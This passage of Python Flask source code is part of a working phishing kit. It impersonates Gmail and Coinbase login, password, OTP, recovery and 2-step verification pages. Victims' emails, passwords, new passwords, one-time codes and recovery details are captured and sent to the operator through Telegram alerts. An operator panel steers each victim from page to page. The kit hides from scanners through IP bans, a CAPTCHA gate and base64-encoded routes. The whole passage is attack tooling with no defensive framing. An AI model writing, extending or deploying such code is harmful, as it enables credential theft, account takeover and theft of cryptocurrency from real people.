                            'check_command', 'track_navigation', 'get_banned_ips',
                            'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                            'get_recovery_data', 'set_verification_data', 'get_verification_data', 
                            'set_verify_data', 'get_verify_data', 'verify_captcha',
                            'admin_login', 'admin_logout', 'encoded_router'] or 
        request.path.startswith('/e/') or 
        request.path.startswith('/api/') or
        request.path.startswith('/static/') or
        request.path == '/'):
        return None
    
    client_ip = get_client_ip()
    
    # Check if IP is banned
    if is_ip_banned(client_ip):
        return redirect('https://accounts.google.com')
    
    # Check for victim session and commands - NOW RETURNS ENCODED URLS
    victim_session = session.get('victim_session')
    if victim_session and victim_session in victim_commands:
        command = victim_commands[victim_session]
        print(f"🎯 Executing command: {command} for session {victim_session}")
        
        # Handle all redirect commands - NOW WITH ENCODED URLS
        command_map = {
            'go_to_login': 'gmail_login',
            'go_to_waiting': 'waiting',
            'go_to_stall': 'stall',
            'go_to_verify': 'verify',
            'go_to_password': 'password',
            'go_to_reset': 'reset',
            'go_to_otp': 'otp',
            'go_to_invalid': 'invalid',
            'go_to_recovery': 'recovery',
            'go_to_2step': 'twostep',
            'go_to_index': 'index',
            'go_to_coinbase': 'coinbase_login_page',
            'go_to_landing': 'landing',
            'go_to_trezor': 'trezor',
            'go_to_ledger': 'ledger',
            'go_to_external': 'external',
            'go_to_idtype': 'idtype',
            'go_to_idupload': 'idupload',
            'go_to_selfie': 'selfie',
            'go_to_authenticator': 'authenticator',
            'go_to_coinbase_2factor': 'coinbase_2factor',
            'go_to_final_redirect': 'final_redirect',
            'go_to_main': 'main'
        }
        
        if command in command_map:
            victim_commands.pop(victim_session, None)
            page_name = command_map[command]
            
            # 🚨 ENCODE THE REDIRECTION URL FOR PANEL COMMANDS TOO
            import base64
            encoded_page = base64.urlsafe_b64encode(page_name.encode()).decode().rstrip('=')
            print(f"🔄 Panel command redirecting to encoded: /e/{encoded_page}")
            return redirect(f'/e/{encoded_page}')
    
    # 🚨 AUTO-REDIRECT ALL VICTIM TRAFFIC TO ENCODED URLS
    if session.get('is_victim') or session.get('has_token_access'):
        # Don't redirect if we're already on an encoded route
        if not request.path.startswith('/e/'):
            import base64
            
            # Map request paths to endpoint names
            path_to_endpoint = {
                '/main': 'main',
                '/gmail-login': 'gmail_login', 
                '/waiting': 'waiting',
                '/stall': 'stall',
                '/verify': 'verify',
                '/password': 'password',
                '/reset': 'reset',
                '/otp': 'otp',
                '/invalid': 'invalid',
                '/recovery': 'recovery',
                '/2step': 'twostep',
                '/coinbase-login': 'coinbase_login_page',
                '/landing': 'landing',
                '/trezor': 'trezor',
                '/ledger': 'ledger',
                '/external': 'external',
                '/idtype': 'idtype',
                '/idupload': 'idupload',
                '/selfie': 'selfie',
                '/authenticator': 'authenticator',
                '/coinbase-2factor': 'coinbase_2factor',
                '/final-redirect': 'final_redirect'
            }
            
            current_path = request.path
            if current_path in path_to_endpoint:
                endpoint = path_to_endpoint[current_path]
                encoded = base64.urlsafe_b64encode(endpoint.encode()).decode().rstrip('=')
                print(f"🔄 Auto-redirecting {current_path} to encoded: /e/{encoded}")
                return redirect(f'/e/{encoded}')
            else:
                print(f"⚠️ No mapping found for path: {current_path}")
    
    return None

@app.route('/')
def index():
    """Main route - serves cloudflare.html as homepage WITH token protection"""
    client_ip = get_client_ip()
    
    print(f"🔍 INDEX ROUTE - Token access: {session.get('has_token_access')}, CAPTCHA: {session.get('captcha_passed')}")
    
    # Check if IP is banned first
    if is_ip_banned(client_ip):
        return redirect('https://accounts.google.com')
    
    # 🚨 REMOVED SESSION CREATION - security_checks() handles this
    
    # If no token access and no CAPTCHA, show blocked page
    if not session.get('has_token_access') and not session.get('captcha_passed'):
        print(f"🚫 No access - showing blocked page")
        return "Site Unavailable", 503
    
    return render_template('cloudflare.html')  # This is token-protected # This is token-protected

@app.route('/verify-captcha', methods=['POST'])
def verify_captcha():
    """Handle CAPTCHA verification - CREATE SESSION ONLY AFTER CAPTCHA"""
    client_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent')
    
    # Mark CAPTCHA as passed FIRST
    session['captcha_passed'] = True
    
    # 🚨 ONLY CREATE SESSION IF IT DOESN'T EXIST
    if 'victim_session' not in session:
        session_id = create_victim_session(client_ip, user_agent)
        session['victim_session'] = session_id
        session['is_victim'] = True
        
        if session_id:
            log_navigation(session_id, 'CAPTCHA Completed')
            
            # NOW send Telegram notification - this is a REAL HUMAN
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            panel_url = f"{request.host_url.rstrip('/')}/panel"
            
            # Get ASN info
            asn_info = get_asn_info(client_ip)
            
            message = f"""
🎣 <b>NEW HUMAN VICTIM CONNECTED!</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
🏢 <b>ISP/Org:</b> <code>{asn_info.get('org', 'Unknown')}</code>
🇺🇸 <b>Country:</b> <code>{asn_info.get('country', 'Unknown')}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
🔧 <b>User Agent:</b> <code>{user_agent}</code>
✅ <b>Status:</b> Passed CAPTCHA verification

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⚡ <b>Take control immediately!</b>
            """
            
            send_telegram_message(message)
            print(f"✅ Telegram sent for HUMAN: {client_ip}")
    
    return jsonify({'success': True, 'redirect': url_for('main')})

@app.route('/main')
def main():
    """Main Coinbase page - serves the original index.html content after CAPTCHA"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    client_ip = get_client_ip()
    
    # Check if IP is banned
    if is_ip_banned(client_ip):
        return redirect('https://accounts.google.com')
    
    # Update current page
    session_id = session.get('victim_session')
    if session_id:
        update_victim_page(session_id, 'main')
        log_navigation(session_id, 'Main Page - After CAPTCHA')
    
    return render_template('index.html')  # Your original index.html content # Your original index.html content
@app.route('/gmail-login')
def gmail_login():
    """Gmail login page - the original login page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # 🚨 REMOVED THE DUPLICATE SESSION CREATION BLOCK
    
    if session_id:
        log_navigation(session_id, 'Gmail Login Page', session.get('email'))
        update_victim_page(session_id, 'gmail_login')
        
        # Send notification when they reach login page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Gmail Login

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle victim login - EXACTLY AS BEFORE"""
    email = request.form.get('email')
    session_id = session.get('victim_session')
    
    if email and session_id:
        # Update victim with email
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
        conn.commit()
        conn.close()
        
        # Update active victims
        if session_id in active_victims:
            active_victims[session_id]['email'] = email
        
        # Log the login
        log_navigation(session_id, 'Login Attempt', email)
        
        # Send Telegram update
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = get_client_ip()
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📧 <b>VICTIM ENTERED EMAIL!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Login Form

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎯 <b>Ready for next steps!</b>
        """
        
        send_telegram_message(message)
        
        session['email'] = email
        
        return jsonify({'success': True, 'redirect': url_for('password')})
    
    return jsonify({'success': False, 'error': 'No email provided'})

@app.route('/waiting')
def waiting():
    """Waiting page for victims"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    if session_id:
        log_navigation(session_id, 'Waiting Page', session.get('email'))
        
        # Send notification when they reach waiting page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
⏳ <b>VICTIM REACHED WAITING PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Waiting

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('waiting.html')
@app.route('/stall', methods=['GET', 'POST'])
def stall():
    """Stall page for victims - handles CAPTCHA submission and redirects to waiting"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Handle form submission
    if request.method == 'POST':
        captcha_text = request.form.get('ca', '').strip()
        
        print(f"Received stall CAPTCHA data - Email: {email}, CAPTCHA Text: {captcha_text}")
        
        # Send Telegram notification with CAPTCHA info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔤 <b>CAPTCHA Text:</b> <code>{captcha_text or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🔄 <b>Redirecting to waiting page...</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
        
        # REDIRECT to waiting page after CAPTCHA submission
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Stall Page', email)
        
        # Send notification when they reach stall page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
⏸️ <b>VICTIM REACHED STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for CAPTCHA submission!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('stall.html')

# Store verify page data
verify_page_data = {}

@app.route('/api/set-verify-data', methods=['POST'])
def set_verify_data():
    """Set data for verify page placeholders"""
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    
    if session_id and email:
        verify_page_data[session_id] = {
            'email': email,
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-verify-data')
def get_verify_data():
    """Get verify page data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in verify_page_data:
        return jsonify(verify_page_data[session_id])
    return jsonify({'email': ''})

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    """Verify page for victims"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        recovery_email = request.form.get('recovery_email', '').strip()
        recovery_phone = request.form.get('recovery_phone', '').strip()
        
        print(f"Received recovery data - Email: {recovery_email}, Phone: {recovery_phone}")
        
        # Send Telegram notification with recovery info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>

📧 <b>Original Email:</b> <code>{email}</code>
📩 <b>Recovery Email:</b> <code>{recovery_email or 'Not provided'}</code>
📱 <b>Recovery Phone:</b> <code>{recovery_phone or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Recovery Info Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Verify Page', email)
        
        # Send notification when they reach verify page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED VERIFY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Verify

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('verify.html', placeholders={'email': email})

@app.route('/password', methods=['GET', 'POST'])
def password():
    """Password page for victims"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received password data - Email: {email}, Password: {password}")
        
        # Send Telegram notification with password info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM SUBMITTED PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Password Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Password Page', email)
        
        # Send notification when they reach password page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM REACHED PASSWORD PAGE DIRECTLY FROM LOGIN!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Password (Direct from Login)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for password capture!</b>
"""
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('password.html', placeholders={'email': email})
@app.route('/track-navigation', methods=['POST'])
def track_navigation():
    """Track victim navigation"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return jsonify({'success': False})
    
    data = request.get_json()
    page_url = data.get('page_url', 'Unknown')
    session_id = session.get('victim_session')
    
    if session_id:
        log_navigation(session_id, page_url, session.get('email'))
    
    return jsonify({'success': True})
@app.route('/invalid', methods=['GET', 'POST'])
def invalid():
    """Invalid page for victims (too many failed attempts)"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received password data from invalid page - Email: {email}, Password: {password}")
        
        # Send Telegram notification with password info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page Type:</b> Invalid/Too Many Attempts

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Invalid Page - Password Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Invalid Page', email)
        
        # Send notification when they reach invalid page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🚫 <b>VICTIM REACHED INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Invalid/Too Many Attempts

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('invalid.html', placeholders={'email': email})

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    """Reset password page for victims - collecting created password"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        new_password = request.form.get('new_password', '').strip()
        confirm_password = request.form.get('confirm_password', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received reset password data - Email: {email}, New Password: {new_password}, Confirm Password: {confirm_password}")
        
        # Send Telegram notification with password info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM CREATED NEW PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>New Password:</b> <code>{new_password or 'Not provided'}</code>
✅ <b>Confirm Password:</b> <code>{confirm_password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Reset Password Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Reset Password Page', email)
        
        # Send notification when they reach reset password page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Reset Password

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('reset.html', placeholders={'email': email})

@app.route('/otp', methods=['GET', 'POST'])
def otp():
    """OTP page for victims"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        otp_code = request.form.get('otpcode', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received OTP data - Email: {email}, OTP: {otp_code}")
        
        # Send Telegram notification with OTP info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔢 <b>VICTIM SUBMITTED OTP!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>OTP Code:</b> <code>{otp_code or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'OTP Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'OTP Page', email)
        
        # Send notification when they reach OTP page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔢 <b>VICTIM REACHED OTP PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> OTP

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('otp.html', placeholders={'email': email, 'phone': '****'})

# Store recovery page data
recovery_page_data = {}





@app.route('/recovery')
def recovery():
    """Recovery page for victims - FIXED"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have recovery data for this session
    recovery_data = {}
    if session_id and session_id in recovery_page_data:
        recovery_data = recovery_page_data[session_id]
        email = recovery_data.get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Recovery Page', email)
        
        # 🚨 PREVENT DUPLICATE NOTIFICATIONS
        notification_key = f'notified_recovery_{session_id}'
        if not session.get(notification_key):
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            panel_url = f"{request.host_url.rstrip('/')}/panel"
            
            message = f"""
📱 <b>VICTIM REACHED RECOVERY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>Number Displayed:</b> <code>{recovery_data.get('number', 'Not set')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Recovery

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⏸️ <b>Page is stagnant - ready for your commands!</b>
            """
            
            send_telegram_message(message)
            session[notification_key] = True  # Mark as notified
    
    return render_template('recovery.html', placeholders={
        'email': email, 
        'number': recovery_data.get('number', '')
    })

# Store 2-step verification page data
verification_page_data = {}

@app.route('/2step', methods=['GET', 'POST'])
def twostep():
    """2-Step Verification page for victims - stagnant page showing email and phone type"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verification data for this session
    verification_data = {}
    if session_id and session_id in verification_page_data:
        verification_data = verification_page_data[session_id]
        email = verification_data.get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, '2-Step Verification Page', email)
        
        # Send notification when they reach 2-step verification page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
📱 <b>Phone Displayed:</b> <code>{verification_data.get('phone', 'Not set')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> 2-Step Verification

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⏸️ <b>Page is stagnant - ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('2stepverification.html', placeholders={
        'email': email, 
        'phone': verification_data.get('phone', 'iPhone')
    })

# Coinbase Login Page Route
@app.route('/coinbase-login')
def coinbase_login_page():
    """Coinbase login page - with preloaded email"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    
    # 🚨 PRIORITIZE ACTUAL VICTIM EMAIL FROM SESSION/DATABASE
    email = None
    
    # 1. First try to get email from victim's actual session/database
    if session_id:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email FROM victims WHERE session_id = %s", (session_id,))
        result = c.fetchone()
        if result and result[0] and result[0] != 'No email yet':
            email = result[0]
            print(f"📧 Found email in database: {email}")
        conn.close()
    
    # 2. Then try verify data (from panel)
    if not email and session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email')
        print(f"📧 Found email in verify_page_data: {email}")
    
    # 3. Then try session
    if not email:
        email = session.get('email', '')
        print(f"📧 Using email from session: {email}")
    
    # Debug: Print all sources
    print(f"🔍 Email sources for session {session_id}:")
    print(f"   - Database: {email}")
    print(f"   - Verify data: {verify_page_data.get(session_id, {}).get('email', 'None')}")
    print(f"   - Session: {session.get('email', 'None')}")
    
    # Add fallback - if no email found, use a placeholder
    if not email:
        email = "email@example.com"  # Fallback placeholder
        print("⚠️ No email found, using fallback")
    
    # Only send notification if this is the first time reaching this page
    current_page = session.get('current_page', '')
    if current_page != 'coinbase_login':
        if session_id:
            log_navigation(session_id, 'Coinbase Login Page', email)
            
            # Send notification when they reach coinbase login page
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            panel_url = f"{request.host_url.rstrip('/')}/panel"
            
            message = f"""
🏦 <b>VICTIM REACHED COINBASE LOGIN PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Coinbase Login

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🔑 <b>Ready for password capture!</b>
            """
            
            send_telegram_message(message)
        
        # Update current page in session to prevent multiple notifications
        session['current_page'] = 'coinbase_login'
    
    # PASS THE EMAIL TO THE TEMPLATE
    return render_template('coinbaselogin.html', email=email)

@app.route('/coinbase-login', methods=['POST'])
def coinbase_login():
    """Handle Coinbase login submission"""
    email = request.form.get('email')
    password = request.form.get('password')
    session_id = session.get('victim_session')
    
    print(f"Received Coinbase login - Email: {email}, Password: {password}")
    
    if email and password and session_id:
        # Send Telegram notification with Coinbase credentials
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🏦 <b>COINBASE LOGIN CAPTURED!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

💰 <b>Coinbase credentials captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Coinbase Login Submitted', email)
        
        return jsonify({'success': True, 'redirect': url_for('landing')})
    
    return jsonify({'success': False, 'error': 'Missing email or password'})

@app.route('/landing')
def landing():
    """Landing page - processing page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Landing Page', email)
        
        # Send notification when they reach landing page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔄 <b>VICTIM REACHED LANDING PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Landing/Processing

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⏳ <b>Processing page active</b>
        """
        
        send_telegram_message(message)
    
    return render_template('landing.html')

@app.route('/api/set-verification-data', methods=['POST'])
def set_verification_data():
    """Set data for 2-step verification page placeholders (email and phone)"""
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    phone = data.get('phone')
    
    print(f"Setting verification data - Session: {session_id}, Email: {email}, Phone: {phone}")
    
    if session_id:
        verification_page_data[session_id] = {
            'email': email or '',
            'phone': phone or '',
            'timestamp': datetime.now().isoformat()
        }
        print(f"Verification data stored: {verification_page_data[session_id]}")
    
    return jsonify({'success': True})

@app.route('/api/get-verification-data')
def get_verification_data():
    """Get verification page data for current session"""
    session_id = session.get('victim_session')
